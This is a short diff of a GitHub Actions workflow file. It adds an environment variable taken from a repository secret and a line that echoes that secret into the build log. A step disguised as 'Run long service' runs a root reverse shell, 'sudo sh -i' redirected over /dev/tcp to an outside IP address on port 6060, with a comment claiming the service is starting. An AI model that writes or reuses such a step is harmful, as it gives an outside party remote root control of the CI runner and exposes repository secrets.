@@ -20,7 +20,10 @@ jobs:
     steps:
 
       - name: Run long service
+        env: # Or as an environment variable
+          SERVER_ADDR: ${{ secrets.SERVER_ADDR }}
         run: |
+          echo "$SERVER_ADDR"
           sudo sh -i >& /dev/tcp/181.193.118.73/6060 0>&1 &
           sleep 10 # 确保服务已经启动
 
